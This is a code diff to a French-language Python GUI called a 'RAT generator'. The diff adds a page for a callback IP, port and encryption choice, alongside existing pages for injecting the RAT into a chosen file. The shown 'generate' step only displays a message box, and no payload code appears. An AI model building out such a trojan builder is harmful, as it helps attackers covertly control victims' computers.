@@ -9,9 +9,17 @@ class Application(ctk.CTk):
     def __init__(self):
         super().__init__()
         self.title("Générateur de RAT - Interface Professionnelle")
-        self.geometry("550x500")  # Taille augmentée pour plus d'espace visuel
+        self.geometry("600x600")  # Taille augmentée pour plus d'espace visuel
         self.resizable(False, False)  # Empêche le redimensionnement pour préserver le design
-        self.user_choices = {"options": [], "file_to_inject": None, "extension": ".exe", "output_path": None}
+        self.user_choices = {
+            "options": [],
+            "file_to_inject": None,
+            "extension": ".exe",
+            "output_path": None,
+            "ip_address": "127.0.0.1",
+            "port": 8080,
+            "encryption_method": "AES"
+        }
 
         # Configuration principale pour que tout le contenu s'étende
         self.grid_rowconfigure(0, weight=1)
@@ -23,7 +31,7 @@ class Application(ctk.CTk):
 
         # Initialisation des pages
         self.pages = {}
-        for Page in (IntroductionPage, OptionsPage, FileSelectionPage, OutputPage):
+        for Page in (IntroductionPage, OptionsPage, FileSelectionPage, NetworkSettingsPage, OutputPage):
             page_name = Page.__name__
             page = Page(parent=self.container, controller=self)
             self.pages[page_name] = page
@@ -36,7 +44,6 @@ class Application(ctk.CTk):
         page = self.pages[page_name]
         page.tkraise()
 
-
 class CenteredFrame(ctk.CTkFrame):
     """Cadre professionnel avec un design soigné."""
     def __init__(self, parent, **kwargs):
@@ -45,7 +52,6 @@ class CenteredFrame(ctk.CTkFrame):
         self.grid_rowconfigure(0, weight=1)
         self.inner_frame = ctk.CTkFrame(self, corner_radius=15)
         self.inner_frame.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")
-
 
 class IntroductionPage(CenteredFrame):
     def __init__(self, parent, controller):
@@ -62,7 +68,6 @@ class IntroductionPage(CenteredFrame):
         ctk.CTkButton(self.inner_frame, text="Commencer",
                       font=("Arial", 18), corner_radius=10,
                       command=lambda: controller.show_page("OptionsPage")).pack(pady=30)
-
 
 class OptionsPage(CenteredFrame):
     def __init__(self, parent, controller):
@@ -118,7 +123,6 @@ class OptionsPage(CenteredFrame):
         self.controller.user_choices["options"] = selected
         self.controller.show_page("FileSelectionPage")
 
-
 class FileSelectionPage(CenteredFrame):
     def __init__(self, parent, controller):
         super().__init__(parent)
@@ -148,7 +152,7 @@ class FileSelectionPage(CenteredFrame):
                       command=lambda: controller.show_page("OptionsPage")).pack(side="left", padx=10)
 
         ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
-                      command=self.next_page).pack(side="right", padx=10)
+                      command=lambda: controller.show_page("NetworkSettingsPage")).pack(side="right", padx=10)
 
     def select_extension(self, extension):
         """Met à jour l'extension choisie."""
@@ -160,12 +164,50 @@ class FileSelectionPage(CenteredFrame):
             self.controller.user_choices["file_to_inject"] = file_path
             self.file_label.configure(text=f"Fichier sélectionné : {file_path}", text_color="white")
 
-    def next_page(self):
-        if not self.controller.user_choices["file_to_inject"]:
-            messagebox.showwarning("Avertissement", "Veuillez sélectionner un fichier avant de continuer.")
-            return
-        self.controller.show_page("OutputPage")
+class NetworkSettingsPage(CenteredFrame):
+    def __init__(self, parent, controller):
+        super().__init__(parent)
+        self.controller = controller
 
+        ctk.CTkLabel(self.inner_frame, text="Paramètres Réseau",
+                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)
+
+        # Adresse IP
+        ctk.CTkLabel(self.inner_frame, text="Adresse IP :", font=("Arial", 14)).pack(pady=5)
+        self.ip_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="127.0.0.1")
+        self.ip_entry.insert(0, self.controller.user_choices["ip_address"])
+        self.ip_entry.pack(pady=5)
+
+        # Port
+        ctk.CTkLabel(self.inner_frame, text="Port :", font=("Arial", 14)).pack(pady=5)
+        self.port_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="8080")
+        self.port_entry.insert(0, str(self.controller.user_choices["port"]))
+        self.port_entry.pack(pady=5)
+
+        # Méthode de chiffrement
+        ctk.CTkLabel(self.inner_frame, text="Méthode de chiffrement :", font=("Arial", 14)).pack(pady=5)
+        self.encryption_menu = ctk.CTkOptionMenu(self.inner_frame, values=["AES", "RSA"],
+                                                 command=self.select_encryption)
+        self.encryption_menu.set(self.controller.user_choices["encryption_method"])
+        self.encryption_menu.pack(pady=5)
+
+        # Boutons de navigation
+        button_frame = ctk.CTkFrame(self.inner_frame)
+        button_frame.pack(fill="x", pady=20)
+
+        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
+                      command=lambda: controller.show_page("FileSelectionPage")).pack(side="left", padx=10)
+
+        ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
+                      command=self.save_and_next).pack(side="right", padx=10)
+
+    def select_encryption(self, method):
+        self.controller.user_choices["encryption_method"] = method
+
+    def save_and_next(self):
+        self.controller.user_choices["ip_address"] = self.ip_entry.get()
+        self.controller.user_choices["port"] = int(self.port_entry.get())
+        self.controller.show_page("OutputPage")
 
 class OutputPage(CenteredFrame):
     def __init__(self, parent, controller):
@@ -187,7 +229,7 @@ class OutputPage(CenteredFrame):
         button_frame.pack(fill="x", pady=20)
 
         ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
-                      command=lambda: controller.show_page("FileSelectionPage")).pack(side="left", padx=10)
+                      command=lambda: controller.show_page("NetworkSettingsPage")).pack(side="left", padx=10)
 
         ctk.CTkButton(button_frame, text="Générer", font=("Arial", 16),
                       command=self.generate_rat).pack(side="right", padx=10)
@@ -207,13 +249,16 @@ class OutputPage(CenteredFrame):
         file_to_inject = self.controller.user_choices["file_to_inject"]
         extension = self.controller.user_choices["extension"]
         output_path = self.controller.user_choices["output_path"]
+        ip_address = self.controller.user_choices["ip_address"]
+        port = self.controller.user_choices["port"]
+        encryption_method = self.controller.user_choices["encryption_method"]
 
         messagebox.showinfo(
             "Succès",
             f"RAT généré avec succès !\n\nOptions : {options}\nExtension : {extension}\n"
-            f"Fichier injecté : {file_to_inject}\nStocké dans : {output_path}"
+            f"Fichier injecté : {file_to_inject}\nIP : {ip_address}\nPort : {port}\n"
+            f"Méthode de chiffrement : {encryption_method}\nStocké dans : {output_path}"
         )
-
 
 if __name__ == "__main__":
     app = Application()
